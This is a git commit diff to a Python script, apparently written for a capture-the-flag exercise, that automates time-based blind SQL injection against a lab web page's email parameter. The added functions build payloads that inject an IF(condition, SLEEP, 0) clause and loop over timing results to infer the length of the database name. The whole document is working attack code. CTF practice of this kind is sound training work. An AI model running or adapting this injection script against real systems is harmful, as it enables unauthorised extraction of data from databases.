7e7568ddb0069412cd9968ce78a560cd7bcfcff7
Jono Nicholas <jono.nicholas@hotmail.co.uk>
2021-02-07 14:07:50 +0000

    Added make_payload and get_length

--- blind_ctf.py
+++ blind_ctf.py
@@ -2,28 +2,48 @@
 
 import requests
 from urllib.parse import quote_plus
+from time import time
 
 
 class Blind():
-	def __init__(self, url='http://10.102.10.42/regards.php?email='):
+	def __init__(self, url='http://10.102.10.42/regards.php?email=',
+				 delay=0.1):
 		self.url = url
+		self.delay = delay
 
 	def send(self, payload, method='GET'):
 		payload = quote_plus(payload)
+		start = time()
 		if method == 'GET':
 			r = requests.get(self.url + payload)
-		elif mehod == 'POST':
+		elif method == 'POST':
 			r = requests.post(self.url, data=payload)
 
-		r.raise_for_status()
-
-		if r.status_code == 200:
-			return r.text
+		end = time()
+		if end - start >= self.delay:
+			return True
 		else:
-			return r.status_code, r.reason
+			return False
+
+	def make_payload(self, cond):
+		query = "' OR IF(" + cond + ",SLEEP(" + str(self.delay) + \
+				"),0) AND 'a'='a"
+		return query
+
+	def get_length(self, item):
+		condition = 'LENGTH(' + item + ')={}'
+		r = False
+		i = 0
+
+		while not r:
+			i += 1
+			payload = self.make_payload(condition.format(i))
+			r = self.send(payload)
+
+		return i
 
 
 if __name__ == '__main__':
 	b = Blind()
-	r = b.send("' OR SLEEP(3) AND '1'='1")
-	print(r)
+
+	print(b.get_length('DATABASE()'))
